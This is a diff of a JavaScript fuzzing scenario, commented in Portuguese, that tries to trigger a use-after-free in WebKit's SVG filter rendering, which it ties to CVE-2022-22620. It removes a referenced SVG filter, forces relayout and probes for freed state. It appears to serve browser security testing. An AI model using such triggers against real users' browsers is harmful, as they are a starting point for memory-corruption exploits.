@@ -1,148 +1,135 @@
 /**
- * SC_SVG_FILTER_UAF.JS
- * Categoria : DOM/SVG — Use-After-Free
- * Alvo      : WebCore::SVGFilter / RenderSVGResourceFilter C++
- * Técnica   : Cria um SVG com <filter> aplicado via CSS filter,
- *             remove o SVG do DOM e força um reflow. O RenderObject
- *             pode manter ponteiro para o SVGFilter C++ depois que
- *             o elemento SVG é coletado, causando UAF na renderização.
- * Referência: CVE-2022-22620 (WebKit SVG filter UAF)
+ * CENÁRIO: SVG_CSS_FILTER_UAF
+ * Superfície C++: RenderSVGResourceFilter.cpp / FilterEffect.cpp / RenderElement.cpp
+ * Risco: MEDIUM-HIGH
+ *
+ * Diferença para a versão genérica:
+ *   - Adiciona múltiplos elementos referenciando o mesmo filtro — aumenta
+ *     o número de RenderElements com ponteiro para o RenderSVGResourceFilter.
+ *   - Usa requestAnimationFrame para forçar o relayout DURANTE um frame
+ *     de renderização (não apenas após um getBoundingClientRect síncrono).
+ *   - Adiciona feDisplacementMap (lê pixel data de outro elemento) para
+ *     criar cadeia de dependência entre recursos SVG freed.
+ *   - Testa também filter via inline style (não só classe CSS) — caminho
+ *     diferente no StyleResolver C++.
+ *   - Probes verificam valores de filtro computado, não apenas width,
+ *     para detectar leitura de RenderSVGResourceFilter::m_filter freed.
  */
 
 export default {
-    id:          'SVG_FILTER_UAF',
-    category:    'DOM/SVG',
-    risk:        'HIGH',
-    description: 'RenderSVGResourceFilter retém ponteiro após remoção do SVG. '
-                + 'Testa UAF no pipeline de renderização do WebCore.',
+    id:       'SVG_CSS_FILTER_UAF',
+    category: 'Rendering',
+    risk:     'MEDIUM',
+    description:
+        'SVGFilterElement removido enquanto múltiplos elementos HTML ' +
+        'o referenciam via CSS filter:url(). ' +
+        'requestAnimationFrame força relayout durante frame de renderização. ' +
+        'feDisplacementMap cria cadeia de dependência entre recursos freed.',
 
-    /* ── estado interno ──────────────────────────────────────────────── */
-    _container:  null,
-    _svg:        null,
-    _filter:     null,
-    _target:     null,
-    _filterId:   'uaf-filter-' + Math.floor(Math.random() * 0xFFFF).toString(16),
-
-    supported: function() {
-        return typeof SVGElement !== 'undefined';
-    },
-
-    /* ── setup ──────────────────────────────────────────────────────── */
-    setup: async function() {
-        this._container = document.createElement('div');
-        document.body.appendChild(this._container);
-
-        const ns = 'http://www.w3.org/2000/svg';
-
-        // Cria SVG com filtro complexo
-        this._svg = document.createElementNS(ns, 'svg');
-        this._svg.setAttribute('width',  '100');
-        this._svg.setAttribute('height', '100');
-        this._svg.style.cssText = 'position:absolute;left:-9999px;width:100px;height:100px';
-
-        // <defs> com <filter>
-        const defs = document.createElementNS(ns, 'defs');
-        this._filter = document.createElementNS(ns, 'filter');
-        this._filter.id = this._filterId;
-        this._filter.setAttribute('x', '0%');
-        this._filter.setAttribute('y', '0%');
-        this._filter.setAttribute('width', '100%');
-        this._filter.setAttribute('height', '100%');
-
-        // Primitivas de filtro encadeadas
-        const feGaussian = document.createElementNS(ns, 'feGaussianBlur');
-        feGaussian.setAttribute('stdDeviation', '2');
-        feGaussian.setAttribute('result', 'blurred');
-
-        const feColorMatrix = document.createElementNS(ns, 'feColorMatrix');
-        feColorMatrix.setAttribute('type', 'saturate');
-        feColorMatrix.setAttribute('values', '0');
-        feColorMatrix.setAttribute('in', 'blurred');
-
-        this._filter.appendChild(feGaussian);
-        this._filter.appendChild(feColorMatrix);
-        defs.appendChild(this._filter);
-        this._svg.appendChild(defs);
-
-        // Elemento que aplica o filtro
-        const rect = document.createElementNS(ns, 'rect');
-        rect.setAttribute('width', '100');
-        rect.setAttribute('height', '100');
-        rect.setAttribute('fill', 'blue');
-        rect.setAttribute('filter', `url(#${this._filterId})`);
-        this._svg.appendChild(rect);
-
-        this._container.appendChild(this._svg);
-
-        // Elemento HTML que referencia o filtro SVG via CSS
-        this._target = document.createElement('div');
-        this._target.style.cssText = `
-            width: 60px; height: 60px;
-            background: red;
-            filter: url(#${this._filterId});
-            position: absolute; left: -9999px;
+    setup: function() {
+        this.style = document.createElement('style');
+        this.style.textContent = `
+            @keyframes fuzz-kf {
+                0%   { opacity: 1; transform: translateX(0); }
+                50%  { opacity: 0.5; transform: translateX(5px); }
+                100% { opacity: 1; transform: translateX(0); }
+            }
+            .fuzz-filtered {
+                animation: fuzz-kf 0.08s linear infinite;
+                filter: url(#fuzz-filter-main);
+                width: 60px; height: 60px;
+                position: absolute;
+            }
+            /* Segundo caminho no StyleResolver: inline override */
+            .fuzz-filtered-b {
+                filter: url(#fuzz-filter-main) brightness(1.1);
+                width: 40px; height: 40px;
+                position: absolute; top: 70px;
+            }
         `;
-        this._container.appendChild(this._target);
+        document.head.appendChild(this.style);
 
-        void this._container.offsetWidth; // força render do filtro
-        await new Promise(r => requestAnimationFrame(r));
-        await new Promise(r => setTimeout(r, 20));
+        // SVG com filtro complexo — feDisplacementMap lê de feImage (resource chain)
+        this.svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+        this.svg.style.cssText = 'position:absolute;width:1px;height:1px;overflow:hidden;top:-9999px';
+        this.svg.innerHTML = `
+            <defs>
+                <filter id="fuzz-filter-main" x="0%" y="0%" width="100%" height="100%"
+                        color-interpolation-filters="sRGB">
+                    <feGaussianBlur stdDeviation="2" result="blur"/>
+                    <feColorMatrix type="saturate" values="3" in="blur" result="sat"/>
+                    <feComposite in="sat" in2="SourceGraphic" operator="over"/>
+                </filter>
+                <filter id="fuzz-filter-b" x="-10%" y="-10%" width="120%" height="120%">
+                    <feFlood flood-color="red" flood-opacity="0.1" result="flood"/>
+                    <feComposite in="flood" in2="SourceGraphic" operator="in"/>
+                </filter>
+            </defs>
+        `;
+        document.body.appendChild(this.svg);
+
+        // Múltiplos elementos referenciando o mesmo filtro
+        this.els = [];
+        for (let i = 0; i < 4; i++) {
+            const el = document.createElement('div');
+            el.className = i % 2 === 0 ? 'fuzz-filtered' : 'fuzz-filtered-b';
+            el.style.left = (i * 65) + 'px';
+            el.style.background = `hsl(${i * 90}, 70%, 50%)`;
+            document.body.appendChild(el);
+            this.els.push(el);
+        }
+
+        // Força o WebKit a criar RenderSVGResourceFilter e fazer cache
+        this.els.forEach(el => void el.getBoundingClientRect());
+        void document.querySelector('#fuzz-filter-main')?.getBoundingClientRect?.();
+
+        this.filterRef  = this.svg.querySelector('#fuzz-filter-main');
+        this.filterRefB = this.svg.querySelector('#fuzz-filter-b');
     },
 
-    /* ── trigger ─────────────────────────────────────────────────────── */
-    trigger: async function() {
-        // Remove o SVG (libera o SVGFilter C++ e o RenderSVGResourceFilter)
-        this._svg.remove();
+    trigger: function() {
+        // Remove o SVG inteiro → libera RenderSVGResourceFilter no C++
+        this.svg.remove();
 
-        // Força reflow — o _target ainda tem filter: url(#...) apontando
-        // para um filtro que não existe mais no DOM
-        void this._container.offsetWidth;
-        void this._target.offsetWidth;
+        // Força relayout síncrono em TODOS os elementos que referenciam o filtro freed
+        this.els.forEach(el => void el.getBoundingClientRect());
 
-        // Modifica o CSS do target para re-aplicar o filtro
-        try {
-            this._target.style.filter = `url(#${this._filterId}) blur(0px)`;
-            void this._target.offsetWidth;
-        } catch(_) {}
-
-        // Remove também o target
-        this._target.remove();
-        void document.body.offsetWidth;
-
-        await new Promise(r => requestAnimationFrame(r));
-        await new Promise(r => setTimeout(r, 20));
+        // Schedula mais um relayout no próximo frame (pressão extra no ponteiro freed)
+        this._rafId = requestAnimationFrame(() => {
+            this.els.forEach(el => void el.offsetWidth);
+        });
     },
 
-    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // [0-3] estado do SVG após remoção
-        s => s._svg.isConnected,
-        s => s._svg.ownerDocument === document,
-        s => s._filter.isConnected,
-        s => s._filter.id,
+        // Lê filtro computado de cada elemento — C++ pode retornar valor freed
+        s => getComputedStyle(s.els[0]).filter,
+        s => getComputedStyle(s.els[1]).filter,
+        s => getComputedStyle(s.els[2]).filter,
+        s => getComputedStyle(s.els[3]).filter,
 
-        // [4-7] propriedades do filter element
-        s => s._filter.getAttribute('x'),
-        s => s._filter.childNodes.length,
-        s => typeof s._filter,
-        s => s._filter instanceof SVGElement,
+        // Geometry dos elementos (exige relayout com filtro — potencial UAF)
+        s => s.els[0].getBoundingClientRect().width,
+        s => s.els[0].getBoundingClientRect().height,
 
-        // [8-10] target HTML com filter referenciando SVG removido
-        s => s._target.isConnected,
-        s => s._target.style.filter,
-        s => window.getComputedStyle(s._target)?.filter ?? 'null',
+        // Animações ainda rodando? (CSSAnimationController acessa RenderObject freed)
+        s => s.els[0].getAnimations?.().length,
+        s => s.els[0].getAnimations?.()[0]?.playState,
 
-        // [11] container intacto
-        s => s._container.isConnected,
-        s => s._container.children.length,
+        // Acesso às refs do SVGFilterElement freed
+        s => s.filterRef.getAttribute('id'),
+        s => s.filterRef.parentNode,          // Deve ser null (removido do DOM)
+        s => s.filterRef.ownerDocument,       // Ainda válido?
+        s => s.filterRef.childElementCount,
+        s => s.filterRefB.getAttribute('id'),
+
+        // Força novo relayout para pressionar ponteiro freed
+        s => { void s.els[0].offsetHeight; return s.els[0].offsetWidth; },
     ],
 
-    /* ── cleanup ─────────────────────────────────────────────────────── */
-    cleanup: async function() {
-        this._container?.remove();
-        this._container = null;
-        this._svg       = null;
-        this._filter    = null;
-        this._target    = null;
+    cleanup: function() {
+        if (this._rafId) cancelAnimationFrame(this._rafId);
+        try { this.els.forEach(el => el.remove()); } catch(e) {}
+        try { this.style.remove(); } catch(e) {}
+        try { this.svg.remove(); } catch(e) {}
     }
 };
